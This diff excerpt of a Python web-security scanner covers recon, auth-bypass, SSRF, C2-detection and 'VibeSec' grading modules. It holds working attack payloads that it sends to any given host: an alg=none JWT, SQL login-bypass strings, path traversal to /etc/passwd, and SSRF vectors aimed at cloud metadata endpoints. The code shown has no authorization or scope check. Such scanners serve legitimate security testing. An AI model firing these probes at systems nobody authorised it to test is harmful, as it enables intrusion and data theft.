+   649→        add(f"TXT Records — {len(txt_lines)} ({len(spf)} SPF)", "info", "dns",
+   650→            f"{len(txt_lines)} TXT records, {len(spf)} SPF", "; ".join(txt_lines[:3]))
+   651→
+   652→    # 2. HTTP Headers
+   653→    categories_run.append("HTTP Security Headers")
+   654→    r = http_probe(f"https://{host}/")
+   655→    if r["status"]:
+   656→        hdrs = r["headers"]
+   657→        sec_headers = ["strict-transport-security", "content-security-policy", "x-frame-options",
+   658→                       "x-content-type-options", "referrer-policy", "permissions-policy"]
+   659→        present = [h for h in sec_headers if h in hdrs]
+   660→        missing = [h for h in sec_headers if h not in hdrs]
+   661→        for h in missing:
+   662→            add(f"Missing security header: {h}", "medium", "headers",
+   663→                f"The {h} header is not set. This leaves users vulnerable to specific client-side attacks.",
+   664→                f"Header {h} absent from response")
+   665→        for h in present:
+   666→            add(f"Security header present: {h}", "info", "headers",
+   667→                f"{h} is set: {hdrs[h][:80]}", f"{h}: {hdrs[h][:80]}")
+   668→        server = hdrs.get("server", "")
+   669→        if server:
+   670→            add(f"Server header disclosure: {server}", "low", "headers",
+   671→                f"Server software disclosed: {server}", f"Server: {server}")
+   672→        # Tech fingerprint
+   673→        for sig in ["cloudflare", "nginx", "apache", "gunicorn", "envoy", "istio", "aws", "gcp"]:
+   674→            if sig in json.dumps(hdrs).lower():
+   675→                add(f"Tech fingerprint: {sig}", "info", "headers", f"Signal {sig} detected in headers", sig)
+   676→
+   677→    # 3. TLS Certificate
+   678→    categories_run.append("TLS Certificate Analysis")
+   679→    try:
+   680→        ctx = ssl.create_default_context()
+   681→        with socket.create_connection((host, 443), timeout=5) as sock:
+   682→            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
+   683→                cert = ssock.getpeercert()
+   684→                if cert:
+   685→                    subject = dict(x[0] for x in cert.get("subject", []))
+   686→                    issuer = dict(x[0] for x in cert.get("issuer", []))
+   687→                    not_after = cert.get("notAfter", "")
+   688→                    add(f"TLS Certificate — {subject.get('commonName', 'unknown')}", "info", "tls",
+   689→                        f"Issued by {issuer.get('commonName', 'unknown')}, expires {not_after}",
+   690→                        f"CN={subject.get('commonName', '')}, issuer={issuer.get('commonName', '')}")
+   691→    except Exception as e:
+   692→        add(f"TLS handshake failed: {str(e)[:60]}", "medium", "tls", str(e)[:100], str(e)[:100])
+   693→
+   694→    # 4. Subdomain enumeration (passive via crt.sh)
+   695→    categories_run.append("Subdomain Enumeration")
+   696→    try:
+   697→        r2 = http_probe(f"https://crt.sh/?q=%.{host}&output=json", timeout=10)
+   698→        if r2["status"] == 200 and r2["body"]:
+   699→            data = json.loads(r2["body"])
+   700→            subs = set()
+   701→            for d in data[:200]:
+   702→                name = d.get("name_value", "")
+   703→                for n in name.split('\n'):
+   704→                    if n.endswith(host) and '*' not in n:
+   705→                        subs.add(n.strip())
+   706→            if subs:
+   707→                add(f"Subdomain enumeration — {len(subs)} found via crt.sh", "info", "subdomain",
+   708→                    f"{len(subs)} unique subdomains discovered", "; ".join(list(subs)[:5]))
+   709→    except Exception as e:
+   710→        audit_log("recon.subdomain.error", status=type(e).__name__, detail=str(e)[:120])
+   711→
+   712→    # 5. Robots.txt
+   713→    categories_run.append("Robots.txt Analysis")
+   714→    r = http_probe(f"https://{host}/robots.txt")
+   715→    if r["status"] == 200 and r["body"]:
+   716→        lines = [l.strip() for l in r["body"].split('\n') if l.strip()]
+   717→        disallows = [l for l in lines if l.lower().startswith('disallow')]
+   718→        if disallows:
+   719→            add(f"robots.txt — {len(disallows)} Disallow rules", "info", "robots",
+   720→                f"{len(disallows)} paths disallowed", "; ".join(disallows[:5]))
+   721→
+   722→    # 6. Sitemap
+   723→    categories_run.append("Sitemap Analysis")
+   724→    r = http_probe(f"https://{host}/sitemap.xml")
+   725→    if r["status"] == 200 and r["body"]:
+   726→        urls = re.findall(r'<loc>([^<]+)</loc>', r["body"])
+   727→        if urls:
+   728→            add(f"sitemap.xml — {len(urls)} URLs", "info", "sitemap",
+   729→                f"{len(urls)} URLs exposed in sitemap", "; ".join(urls[:3]))
+   730→
+   731→    # 7. Common paths
+   732→    categories_run.append("Common Path Probing")
+   733→    for path in ["/.env", "/.git/config", "/wp-admin", "/admin", "/api", "/v1", "/.well-known/security.txt",
+   734→                 "/server-status", "/phpinfo.php", "/actuator", "/metrics"]:
+   735→        r = http_probe(f"https://{host}{path}", timeout=4)
+   736→        if r["status"] not in (0, 404) and r["status"] < 500:
+   737→            sev = "critical" if path in ["/.env", "/.git/config"] else ("high" if path in ["/wp-admin", "/admin"] else "info")
+   738→            add(f"Path exposed: {path} (HTTP {r['status']})", sev, "paths",
+   739→                f"{path} returned HTTP {r['status']}", f"GET {path} → {r['status']}")
+   740→
+   741→    # 8. Open ports (top 12)
+   742→    categories_run.append("Port Scan (top 12)")
+   743→    try:
+   744→        ip = socket.gethostbyname(host)
+   745→        for port in [21, 22, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]:
+   746→            try:
+   747→                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   748→                s.settimeout(1.5)
+   749→                result = s.connect_ex((ip, port))
+   750→                if result == 0:
+   751→                    add(f"Open port: {port}/tcp", "medium" if port in [21, 25, 3306, 5432, 6379, 9200, 27017] else "info",
+   752→                        "ports", f"Port {port}/tcp is open", f"{ip}:{port} OPEN")
+   753→                s.close()
+   754→            except Exception:
+   755→                pass
+   756→    except Exception:
+   757→        pass
+   758→
+   759→    # 9. Email security (DMARC, DKIM)
+   760→    categories_run.append("Email Security (DMARC/DKIM)")
+   761→    out, _ = run(f"dig +short +time=3 +tries=1 _dmarc.{host} TXT")
+   762→    if out:
+   763→        add(f"DMARC record present", "info", "email", f"DMARC: {out[:100]}", out[:100])
+   764→    else:
+   765→        add("DMARC record missing", "medium", "email", "No DMARC record found — domain vulnerable to email spoofing", "DMARC query empty")
+   766→
+   767→    # 10. CORS
+   768→    categories_run.append("CORS Analysis")
+   769→    r = http_probe(f"https://{host}/", headers={"Origin": "https://evil.example.com"})
+   770→    if r["status"]:
+   771→        acao = r["headers"].get("access-control-allow-origin", "")
+   772→        if acao == "*" or "evil" in acao:
+   773→            add("Wildcard / reflected CORS origin", "high", "cors",
+   774→                f"Access-Control-Allow-Origin: {acao} — allows arbitrary origins",
+   775→                f"ACAO: {acao}")
+   776→
+   777→    # 11. Cookie security
+   778→    categories_run.append("Cookie Security")
+   779→    if r["status"]:
+   780→        set_cookie = r["headers"].get("set-cookie", "")
+   781→        if set_cookie:
+   782→            issues = []
+   783→            if "secure" not in set_cookie.lower(): issues.append("missing Secure flag")
+   784→            if "httponly" not in set_cookie.lower(): issues.append("missing HttpOnly flag")
+   785→            if "samesite" not in set_cookie.lower(): issues.append("missing SameSite flag")
+   786→            if issues:
+   787→                add(f"Cookie security issues: {', '.join(issues)}", "medium", "cookies",
+   788→                    f"Cookie: {set_cookie[:80]}", "; ".join(issues))
+   789→
+   790→    # 12. WAF detection
+   791→    categories_run.append("WAF Detection")
+   792→    if r["status"]:
+   793→        server = r["headers"].get("server", "").lower()
+   794→        if "cloudflare" in server:
+   795→            add("WAF detected: Cloudflare", "info", "waf", "Cloudflare WAF in front of target", "server: cloudflare")
+   796→        elif "akamai" in server:
+   797→            add("WAF detected: Akamai", "info", "waf", "Akamai WAF", "server: akamai")
+   798→        elif "imperva" in server or "incapsula" in server:
+   799→            add("WAF detected: Imperva/Incapsula", "info", "waf", "Imperva WAF", "server: imperva")
+   800→        else:
+   801→            add("No obvious WAF detected", "low", "waf", "Server header doesn't reveal a WAF", server or "(empty)")
+   802→
+   803→    # 13. JavaScript bundles / framework
+   804→    categories_run.append("JS Framework Fingerprint")
+   805→    if r["status"] and r["body"]:
+   806→        body_lower = r["body"].lower()
+   807→        for fw in ["react", "vue", "angular", "next.js", "__next", "nuxt", "svelte", "ember", "backbone"]:
+   808→            if fw in body_lower:
+   809→                add(f"Frontend framework: {fw}", "info", "framework", f"Signal for {fw} detected", fw)
+   810→
+   811→    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
+   812→    for f in findings:
+   813→        severity_counts[f["severity"]] = severity_counts.get(f["severity"], 0) + 1
+   814→
+   815→    return {
+   816→        "module": "RECON",
+   817→        "categories_run": categories_run,
+   818→        "findings": findings,
+   819→        "total_findings": len(findings),
+   820→        "severity_counts": severity_counts,
+   821→    }
+   822→
+   823→# ══════════════════════════════════════════════════════════════════════════════
+   824→# MODULE 2: AUTH BYPASS — 15 techniques
+   825→# ══════════════════════════════════════════════════════════════════════════════
+   826→
+   827→AUTH_BYPASS_TESTS = [
+   828→    {"id": "AB-001", "name": "JWT None Algorithm", "technique": "Send a JWT signed with alg=none to bypass verification",
+   829→     "payload": lambda h: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0."},
+   830→    {"id": "AB-002", "name": "SQL Auth Bypass — admin'--", "technique": "Classic SQL injection in login form",
+   831→     "payload": lambda h: "admin'--"},
+   832→    {"id": "AB-003", "name": "SQL Auth Bypass — ' OR 1=1--", "technique": "Universal SQL auth bypass",
+   833→     "payload": lambda h: "' OR 1=1--"},
+   834→    {"id": "AB-004", "name": "OAuth Redirect URI Bypass", "technique": "Open redirect in OAuth callback",
+   835→     "payload": lambda h: f"https://{h}/oauth/callback?redirect_uri=https://evil.example.com"},
+   836→    {"id": "AB-005", "name": "Authorization Header Bearer Empty", "technique": "Empty bearer token",
+   837→     "payload": lambda h: ""},
+   838→    {"id": "AB-006", "name": "Authorization Header Bearer admin", "technique": "Plain text admin token",
+   839→     "payload": lambda h: "admin"},
+   840→    {"id": "AB-007", "name": "X-Forwarded-For Spoofing", "technique": "Trusted-internal header spoof",
+   841→     "payload": lambda h: "127.0.0.1"},
+   842→    {"id": "AB-008", "name": "X-Original-URL Override", "technique": "IIS/ASP.NET path override",
+   843→     "payload": lambda h: "/admin"},
+   844→    {"id": "AB-009", "name": "Path Traversal to Auth File", "technique": "Read auth config via traversal",
+   845→     "payload": lambda h: "../../etc/passwd"},
+   846→    {"id": "AB-010", "name": "Default Credentials admin/admin", "technique": "Default credential test",
+   847→     "payload": lambda h: "admin:admin"},
+   848→    {"id": "AB-011", "name": "Default Credentials admin/password", "technique": "Default credential test",
+   849→     "payload": lambda h: "admin:password"},
+   850→    {"id": "AB-012", "name": "Weak API Key — sk-test", "technique": "Test API key",
+   851→     "payload": lambda h: "sk-test"},
+   852→    {"id": "AB-013", "name": "Mass Assignment role=admin", "technique": "Mass assignment escalation",
+   853→     "payload": lambda h: '{"role":"admin","isAdmin":true}'},
+   854→    {"id": "AB-014", "name": "HTTP Method Override — X-HTTP-Method-Override", "technique": "Bypass GET restriction",
+   855→     "payload": lambda h: "DELETE"},
+   856→    {"id": "AB-015", "name": "Cookie Auth Bypass — admin=true", "technique": "Client-side role cookie",
+   857→     "payload": lambda h: "admin=true; role=admin"},
+   858→]
+   859→
+   860→def module_auth_bypass(host: str) -> Dict[str, Any]:
+   861→    results = []
+   862→    for t in AUTH_BYPASS_TESTS:
+   863→        payload_val = t["payload"](host)
+   864→        # Test against common auth endpoints
+   865→        for ep in ["/admin", "/api/user", "/v1/user", "/api/me", "/profile"]:
+   866→            url = f"https://{host}{ep}"
+   867→            headers = {}
+   868→            if "JWT" in t["name"]:
+   869→                headers["Authorization"] = f"Bearer {payload_val}"
+   870→            elif "X-Forwarded" in t["name"]:
+   871→                headers["X-Forwarded-For"] = payload_val
+   872→            elif "X-Original-URL" in t["name"]:
+   873→                headers["X-Original-URL"] = payload_val
+   874→            elif "X-HTTP-Method" in t["name"]:
+   875→                headers["X-HTTP-Method-Override"] = payload_val
+   876→            elif "Cookie" in t["name"]:
+   877→                headers["Cookie"] = payload_val
+   878→            elif "Authorization" in t["name"]:
+   879→                headers["Authorization"] = f"Bearer {payload_val}"
+   880→            else:
+   881→                headers["X-Test-Payload"] = payload_val
+   882→            r = http_probe(url, method="GET", headers=headers, timeout=4)
+   883→            # Detect potential bypass: 200/302 instead of 401/403
+   884→            bypass = r["status"] in (200, 301, 302) and r["status"] != 401 and r["status"] != 403
+   885→            results.append({
+   886→                "id": t["id"], "name": t["name"], "technique": t["technique"],
+   887→                "endpoint": ep, "payload": payload_val[:80],
+   888→                "status": r["status"], "bypass_success": bypass,
+   889→                "bodyPreview": r["body"][:120],
+   890→            })
+   891→            if r["status"] == 0:
+   892→                break  # Endpoint likely doesn't exist
+   893→    bypasses = [r for r in results if r["bypass_success"]]
+   894→    return {
+   895→        "module": "AUTH BYPASS",
+   896→        "techniques_tested": len(AUTH_BYPASS_TESTS),
+   897→        "endpoints_per_technique": 5,
+   898→        "total_attempts": len(results),
+   899→        "bypasses_successful": len(bypasses),
+   900→        "results": results,
+   901→        "bypass_findings": bypasses,
+   902→    }
+   903→
+   904→# ══════════════════════════════════════════════════════════════════════════════
+   905→# MODULE 3: CHAIN HUNTER — SSRF + redirect chain analysis
+   906→# ══════════════════════════════════════════════════════════════════════════════
+   907→
+   908→def module_chain_hunter(host: str) -> Dict[str, Any]:
+   909→    """Hunt SSRF and redirect chains."""
+   910→    findings = []
+   911→    chains_tested = 0
+   912→
+   913→    # SSRF test vectors
+   914→    ssrf_vectors = [
+   915→        {"id": "CH-001", "name": "Internal IP SSRF", "vector": "http://127.0.0.1", "endpoint": "/api/fetch"},
+   916→        {"id": "CH-002", "name": "AWS Metadata SSRF", "vector": "http://169.254.169.254/latest/meta-data/", "endpoint": "/api/fetch"},
+   917→        {"id": "CH-003", "name": "GCP Metadata SSRF", "vector": "http://metadata.google.internal/computeMetadata/v1/", "endpoint": "/api/fetch"},
+   918→        {"id": "CH-004", "name": "Cloudflare Metadata SSRF", "vector": "http://169.254.169.254/cdn-cgi/trace", "endpoint": "/api/fetch"},
+   919→        {"id": "CH-005", "name": "File Protocol SSRF", "vector": "file:///etc/passwd", "endpoint": "/api/fetch"},
+   920→        {"id": "CH-006", "name": "Gopher Protocol SSRF", "vector": "gopher://127.0.0.1:25/_HELO%20test", "endpoint": "/api/fetch"},
+   921→        {"id": "CH-007", "name": "DNS Rebinding SSRF", "vector": "http://rebind.example.com", "endpoint": "/api/fetch"},
+   922→        {"id": "CH-008", "name": "Internal Service SSRF", "vector": "http://localhost:6379/", "endpoint": "/api/fetch"},
+   923→        {"id": "CH-009", "name": "Redirect to Internal", "vector": f"https://{host}/redirect?url=http://127.0.0.1", "endpoint": "/redirect"},
+   924→        {"id": "CH-010", "name": "URL Parameter SSRF", "vector": "http://127.0.0.1", "endpoint": "/api/proxy"},
+   925→    ]
+   926→
+   927→    # Common SSRF parameters
+   928→    ssrf_params = ["url", "target", "uri", "fetch", "next", "redirect", "redirectUrl", "redirect_uri",
+   929→                   "callback", "proxy", "src", "source", "image", "img", "file", "load"]
+   930→
+   931→    # Probe SSRF endpoints
+   932→    for sv in ssrf_vectors:
+   933→        chains_tested += 1
+   934→        for param in ssrf_params[:3]:  # test 3 params per vector
+   935→            url = f"https://{host}{sv['endpoint']}?{param}={urllib.parse.quote(sv['vector'], safe='')}"
+   936→            r = http_probe(url, timeout=5)
+   937→            # Detect SSRF: response contains internal content
+   938→            internal_signals = ["root:x:" in r["body"], "instance-id" in r["body"],
+   939→                                "ami-id" in r["body"], "computeMetadata" in r["body"],
+   940→                                "cdn-cgi" in r["body"], "redis" in r["body"].lower()]
+   941→            ssrf_hit = any(internal_signals) or (r["status"] == 200 and len(r["body"]) > 100 and
+   942→                                                  any(s in r["body"][:200] for s in ["root", "instance", "metadata"]))
+   943→            findings.append({
+   944→                "id": sv["id"], "name": sv["name"], "vector": sv["vector"],
+   945→                "endpoint": sv["endpoint"], "param": param,
+   946→                "status": r["status"], "ssrf_detected": ssrf_hit,
+   947→                "bodyPreview": r["body"][:120],
+   948→            })
+   949→            if r["status"] == 0:
+   950→                break
+   951→
+   952→    # Redirect chain analysis
+   953→    chains_tested += 1
+   954→    redirect_chains = []
+   955→    for path in ["/", "/login", "/admin", "/api", "/redirect"]:
+   956→        url = f"https://{host}{path}"
+   957→        r = http_probe(url, timeout=4)
+   958→        if r["status"] in (301, 302, 303, 307, 308):
+   959→            location = r["headers"].get("location", "")
+   960→            redirect_chains.append({
+   961→                "start": path, "status": r["status"], "redirects_to": location,
+   962→                "open_redirect": "evil" in location.lower() or "//" in location[:8],
+   963→            })
+   964→
+   965→    return {
+   966→        "module": "CHAIN HUNTER",
+   967→        "chains_tested": chains_tested,
+   968→        "ssrf_vectors": len(ssrf_vectors),
+   969→        "findings": findings,
+   970→        "ssrf_detected": len([f for f in findings if f["ssrf_detected"]]),
+   971→        "redirect_chains": redirect_chains,
+   972→        "open_redirects": len([c for c in redirect_chains if c["open_redirect"]]),
+   973→    }
+   974→
+   975→# ══════════════════════════════════════════════════════════════════════════════
+   976→# MODULE 4: BOT HUNTER — C2 / bot infrastructure detection
+   977→# ══════════════════════════════════════════════════════════════════════════════
+   978→
+   979→BOT_SIGNATURES = [
+   980→    {"name": "Mirai C2", "ports": [23, 2323, 7547], "banner": ["mirai", "bot"]},
+   981→    {"name": "Cobalt Strike", "ports": [443, 80, 8080], "banner": ["cobalt", "beacon", "strike"]},
+   982→    {"name": "Metasploit", "ports": [4444, 8443], "banner": ["meterpreter", "msfconsole"]},
+   983→    {"name": "Emotet", "ports": [8080, 443], "banner": ["emotet"]},
+   984→    {"name": "TrickBot", "ports": [447, 808], "banner": ["trickbot"]},
+   985→    {"name": "QakBot", "ports": [8080, 443], "banner": ["qakbot", "qbot"]},
+   986→    {"name": "SolarWinds SUNBURST", "ports": [443], "banner": ["sunburst", "solarwinds"]},
+   987→    {"name": "Log4Shell", "ports": [443, 80, 389], "banner": ["jndi:ldap", "jndi:rmi"]},
+   988→    {"name": "AsyncRAT", "ports": [6666, 7777], "banner": ["asyncrat"]},
+   989→    {"name": "njRAT", "ports": [1177, 5552], "banner": ["njrat"]},
+   990→]
+   991→
+   992→def module_bot_hunter(host: str) -> Dict[str, Any]:
+   993→    """Hunt for C2 / bot infrastructure on the target."""
+   994→    detections = []
+   995→    # Resolve host
+   996→    try:
+   997→        ip = socket.gethostbyname(host)
+   998→    except Exception as e:
+   999→        audit_log("bot.resolve.error", status=type(e).__name__, detail=str(e)[:120])
+  1000→        ip = host
+  1001→
+  1002→    # Probe each signature
+  1003→    for sig in BOT_SIGNATURES:
+  1004→        for port in sig["ports"]:
+  1005→            try:
+  1006→                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  1007→                s.settimeout(2)
+  1008→                if s.connect_ex((ip, port)) == 0:
+  1009→                    # Try to grab banner
+  1010→                    try:
+  1011→                        s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
+  1012→                        banner = s.recv(512).decode("utf-8", errors="replace").lower()
+  1013→                    except Exception:
+  1014→                        banner = ""
+  1015→                    detected = any(b in banner for b in sig["banner"])
+  1016→                    detections.append({
+  1017→                        "signature": sig["name"], "port": port, "open": True,
+  1018→                        "banner_snippet": banner[:80],
+  1019→                        "bot_detected": detected,
+  1020→                    })
+  1021→                s.close()
+  1022→            except Exception as e:
+  1023→                audit_log("bot.probe.error", status=type(e).__name__, detail=f"{sig['name']}:{port} {str(e)[:80]}")
+  1024→
+  1025→    # Check for known C2 paths
+  1026→    c2_paths = ["/beacon", "/c2", "/panel", "/gate.php", "/cmd.php", "/mad Devil", "/login.php",
+  1027→                "/bot/checkin", "/api/bot", "/control"]
+  1028→    for path in c2_paths:
+  1029→        url = f"https://{host}{path}"
+  1030→        r = http_probe(url, timeout=4)
+  1031→        if r["status"] not in (0, 404) and r["status"] < 500:
+  1032→            detections.append({
+  1033→                "signature": "C2 Path Probe", "path": path, "status": r["status"],
+  1034→                "body_snippet": r["body"][:80],
+  1035→                "bot_detected": r["status"] == 200,
+  1036→            })
+  1037→
+  1038→    bot_hits = [d for d in detections if d.get("bot_detected")]
+  1039→    return {
+  1040→        "module": "BOT HUNTER",
+  1041→        "signatures_tested": len(BOT_SIGNATURES),
+  1042→        "paths_probed": len(c2_paths),
+  1043→        "detections": detections,
+  1044→        "total_detections": len(detections),
+  1045→        "bot_hits": len(bot_hits),
+  1046→        "bot_findings": bot_hits,
+  1047→    }
+  1048→
+  1049→# ══════════════════════════════════════════════════════════════════════════════
+  1050→# MODULE 5 + 6: GORGON + OBLIVION (import from sibling modules)
+  1051→# ══════════════════════════════════════════════════════════════════════════════
+  1052→
+  1053→CACHE_DIR = "/home/z/my-project/download"
+  1054→
+  1055→# ── Filename safety (m4) ────────────────────────────────────────────────────
+  1056→_FILENAME_UNSAFE_RE = re.compile(r'[\x00-\x1f\x7f\x80-\x9f/\\:\n\r\t]')
+  1057→_FILENAME_MAX_LEN = 120
+  1058→
+  1059→def _safe_filename(raw: str) -> str:
+  1060→    """Sanitize a user-supplied string for use as a filename component.
+  1061→
+  1062→    Strips: null bytes, control chars, path separators, backslashes.
+  1063→    Truncates to _FILENAME_MAX_LEN. Rejects empty results (returns 'unnamed').
+  1064→    """
+  1065→    cleaned = _FILENAME_UNSAFE_RE.sub('_', raw)
+  1066→    # Collapse consecutive underscores
+  1067→    cleaned = re.sub(r'_{2,}', '_', cleaned)
+  1068→    cleaned = cleaned.strip('._-')
+  1069→    cleaned = cleaned[:_FILENAME_MAX_LEN]
+  1070→    if not cleaned or cleaned in ('.', '..'):
+  1071→        return 'unnamed'
+  1072→    return cleaned
+  1073→
+  1074→def _find_cache(prefix: str, host: str) -> Optional[str]:
+  1075→    """Find a cached JSON for this host with the given prefix."""
+  1076→    if not os.path.isdir(CACHE_DIR):
+  1077→        return None
+  1078→    safe = _safe_filename(host)
+  1079→    candidates = [
+  1080→        f"{CACHE_DIR}/{prefix}_{safe}.json",
+  1081→        f"{CACHE_DIR}/{prefix}_{safe}_v2.json",
+  1082→    ]
+  1083→    # also any *{host}*.json
+  1084→    for f in sorted(os.listdir(CACHE_DIR), reverse=True):
+  1085→        if f.startswith(prefix) and safe in f and f.endswith(".json"):
+  1086→            candidates.append(f"{CACHE_DIR}/{f}")
+  1087→    for c in candidates:
+  1088→        if os.path.exists(c) and os.path.getsize(c) > 100:
+  1089→            return c
+  1090→    return None
+  1091→
+  1092→def module_gorgon(host: str) -> Dict[str, Any]:
+  1093→    """Run GORGON ULTRA — uses cache if available, otherwise in-process call."""
+  1094→    # 1. Try cache
+  1095→    cached = _find_cache("gorgon", host) or _find_cache("model_breaker", host)
+  1096→    if cached:
+  1097→        try:
+  1098→            with open(cached) as f:
+  1099→                data = json.load(f)
+  1100→            data["_cached_from"] = cached
+  1101→            return data
+  1102→        except Exception as e:
+  1103→            audit_log("gorgon.cache_read.error", status=type(e).__name__, detail=str(e)[:120])
+  1104→    # 2. In-process import
+  1105→    sys.path.insert(0, "/home/z/my-project/scripts")
+  1106→    try:
+  1107→        import model_breaker
+  1108→        if hasattr(model_breaker, "run_gorgon_scan"):
+  1109→            return model_breaker.run_gorgon_scan(host)
+  1110→    except Exception as e:
+  1111→        audit_log("gorgon.import.error", status=type(e).__name__, detail=str(e)[:120])
+  1112→    # 3. Subprocess fallback
+  1113→    import subprocess as sp
+  1114→    try:
+  1115→        out_file = f"/tmp/gorgon_{_safe_filename(host)}.json"
+  1116→        r = sp.run(["python3", "/home/z/my-project/scripts/model_breaker.py", host, "-o", out_file],
+  1117→                   capture_output=True, text=True, timeout=180)
+  1118→        if os.path.exists(out_file):
+  1119→            with open(out_file) as f:
+  1120→                return json.load(f)
+  1121→    except Exception as e:
+  1122→        return {"module": "GORGON ULTRA", "error": str(e)}
+  1123→    return {"module": "GORGON ULTRA", "error": "no output"}
+  1124→
+  1125→def module_oblivion(host: str) -> Dict[str, Any]:
+  1126→    """Run OBLIVION — uses cache if available, otherwise in-process call."""
+  1127→    # 1. Try cache
+  1128→    cached = _find_cache("oblivion", host)
+  1129→    if cached:
+  1130→        try:
+  1131→            with open(cached) as f:
+  1132→                data = json.load(f)
+  1133→            data["_cached_from"] = cached
+  1134→            return data
+  1135→        except Exception as e:
+  1136→            audit_log("oblivion.cache_read.error", status=type(e).__name__, detail=str(e)[:120])
+  1137→    # 2. In-process import
+  1138→    sys.path.insert(0, "/home/z/my-project/scripts")
+  1139→    try:
+  1140→        import oblivion
+  1141→        if hasattr(oblivion, "run_oblivion"):
+  1142→            return oblivion.run_oblivion(host)
+  1143→    except Exception as e:
+  1144→        audit_log("oblivion.import.error", status=type(e).__name__, detail=str(e)[:120])
+  1145→    # 3. Subprocess fallback
+  1146→    import subprocess as sp
+  1147→    try:
+  1148→        out_file = f"/tmp/oblivion_{_safe_filename(host)}.json"
+  1149→        r = sp.run(["python3", "/home/z/my-project/scripts/oblivion.py", host, "-o", out_file],
+  1150→                   capture_output=True, text=True, timeout=240)
+  1151→        if os.path.exists(out_file):
+  1152→            with open(out_file) as f:
+  1153→                return json.load(f)
+  1154→    except Exception as e:
+  1155→        return {"module": "OBLIVION", "error": str(e)}
+  1156→    return {"module": "OBLIVION", "error": "no output"}
+  1157→
+  1158→# ══════════════════════════════════════════════════════════════════════════════
+  1159→# MODULE 7: VIBESEC — AI/Vibe-Coding Vulnerability Benchmark
+  1160→# ══════════════════════════════════════════════════════════════════════════════
+  1161→
+  1162→def _vibesec_compute_grade(score: int) -> Tuple[str, str]:
+  1163→    """Map a 0-100 score to a letter grade and rich color."""
+  1164→    for threshold, grade, color in VIBESEC_GRADE_MAP:
+  1165→        if score >= threshold:
+  1166→            return grade, color
+  1167→    return "F", "bold bright_red"
+  1168→
+  1169→
+  1170→def _vibesec_render_badge(target: str, grade: str, score: int) -> str:
+  1171→    """Generate a Markdown badge snippet for GitHub READMEs."""
+  1172→    color_map = {"A+": "brightgreen", "A": "green", "B": "yellow", "C": "red", "D": "orange", "F": "red"}
+  1173→    badge_color = color_map.get(grade, "lightgrey")
+  1174→    return f'![VibeSec Grade {grade}](https://img.shields.io/badge/VibeSec-{grade}-{badge_color}?style=for-the-badge&labelColor=0B1C2C)'
+  1175→
+  1176→
+  1177→def module_vibesec(host: str) -> Dict[str, Any]:
+  1178→    """Rapid AI/vibe-coding vulnerability benchmark.
+  1179→
+  1180→    Checks four categories:
+  1181→      1. Exposed env/config endpoints
+  1182→      2. Unauthenticated API/webhook routes
+  1183→      3. Permissive CORS policies
+  1184→      4. Exposed anon/public backend keys (Supabase, Firebase, S3, R2)
+  1185→
+  1186→    Returns a 100-point VibeSec score with A+ to F grade mapping.
+  1187→    Every finding is verified via native HTTP response validation (zero fabrication).
+  1188→    """
+  1189→    findings: List[Dict[str, Any]] = []
+  1190→    deductions = 0  # each vulnerability deducts from 100
+  1191→
+  1192→    base_url = host if host.startswith("http") else f"https://{host}"
+  1193→
+  1194→    def add(title, severity, category, description, evidence, points_deducted):
+  1195→        nonlocal deductions
+  1196→        deductions += points_deducted
+  1197→        findings.append({
+  1198→            "title": title, "severity": severity, "category": category,
+  1199→            "description": description, "evidence": evidence, "asset": host,
+  1200→            "points_deducted": points_deducted,
+  1201→        })
+  1202→
+  1203→    # ── Category 1: Exposed Environment/Config Files ──────────────────────
+  1204→    audit_log("vibesec.config.start", detail=host)
+  1205→    for path in VIBESEC_SENSITIVE_PATHS:
+  1206→        url = base_url.rstrip("/") + path
+  1207→        resp = http_probe(url, timeout=5)
+  1208→        status = resp.get("status", 0)
+  1209→        body = resp.get("body", "")[:2048]
+  1210→        if status == 200 and len(body) > 10:
+  1211→            # Verify: real content, not just a redirect page
+  1212→            has_secrets = any(kw in body.lower() for kw in [
+  1213→                "api_key", "secret", "password", "token", "database_url",
+  1214→                "private_key", "supabase", "firebase", "aws_access",
+  1215→            ])
+  1216→            if has_secrets:
+  1217→                add(f"Exposed config — {path}", "critical", "exposed_config",
+  1218→                    f"Sensitive configuration endpoint accessible: {path} (200 OK, {len(body)} bytes, contains secrets)",
+  1219→                    f"GET {path} → {status} ({len(body)}B, secrets detected)", 15)
+  1220→            else:
+  1221→                add(f"Exposed config — {path}", "high", "exposed_config",
+  1222→                    f"Configuration endpoint accessible: {path} (200 OK, {len(body)} bytes)",
+  1223→                    f"GET {path} → {status} ({len(body)}B)", 10)
+  1224→        elif status in (200, 201, 301, 302, 307, 308) and status != 404:
+  1225→            add(f"Config path accessible — {path}", "medium", "exposed_config",
+  1226→                f"Endpoint returned {status} (may redirect or serve partial content)",
+  1227→                f"GET {path} → {status}", 5)
+  1228→    audit_log("vibesec.config.done", detail=f"{len([f for f in findings if f['category'] == 'exposed_config'])} findings")
+  1229→
+  1230→    # ── Category 2: Unauthenticated API/Webhook Routes ────────────────────
+  1231→    audit_log("vibesec.api.start", detail=host)
+  1232→    for path in VIBESEC_API_PATHS:
+  1233→        url = base_url.rstrip("/") + path
+  1234→        resp = http_probe(url, timeout=5)
+  1235→        status = resp.get("status", 0)
+  1236→        body = resp.get("body", "")[:2048]
+  1237→        if status == 200:
+  1238→            # Check for auth-required indicators
+  1239→            body_lower = body.lower()
+  1240→            is_protected = any(kw in body_lower for kw in [
+  1241→                "unauthorized", "401", "forbidden", "authentication required",
+  1242→                "\"error\"", "login required",
+  1243→            ])
+  1244→            if not is_protected and len(body) > 20:
+  1245→                add(f"Unauthenticated API — {path}", "high", "unauth_api",
+  1246→                    f"API route accessible without authentication: {path} (200 OK, {len(body)} bytes)",
+  1247→                    f"GET {path} → {status} (no auth required)", 10)
+  1248→            elif status == 200:
+  1249→                add(f"API route reachable — {path}", "medium", "unauth_api",
+  1250→                    f"API route returned 200 but may have auth checks in POST/DELETE",
+  1251→                    f"GET {path} → {status}", 5)
+  1252→        elif status in (403, 401):
+  1253→            pass  # properly protected — no finding
+  1254→        elif status == 404:
+  1255→            pass  # not found — no finding
